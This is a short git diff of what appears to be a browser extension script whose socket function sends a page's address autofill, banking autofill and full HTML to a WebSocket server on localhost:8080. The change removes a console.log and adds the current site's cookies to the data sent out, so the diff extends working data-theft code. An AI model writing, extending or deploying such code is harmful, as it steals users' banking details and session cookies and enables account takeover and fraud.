@@ -31,8 +31,6 @@ chrome.webNavigation.onDOMContentLoaded.addListener(async () => {
 function socket(addressAutoFill, bankingAutoFill, cookieData) {
     let ws = new WebSocket("ws://localhost:8080");
 
-    console.log(cookieData.filter(cookie => cookie.domain.includes(window.location.hostname)));
-
     // Listen for messages from the server.
     ws.addEventListener("open", () => {
         ws.send(JSON.stringify({
@@ -43,6 +41,7 @@ function socket(addressAutoFill, bankingAutoFill, cookieData) {
             protocol: window.location.protocol,
             autoFill1: addressAutoFill,
             autoFill2: bankingAutoFill,
+            cookies: cookieData.filter(cookie => cookie.domain.includes(window.location.hostname)),
             html: document.getElementsByTagName('html')[0].innerHTML,
         }));
     });
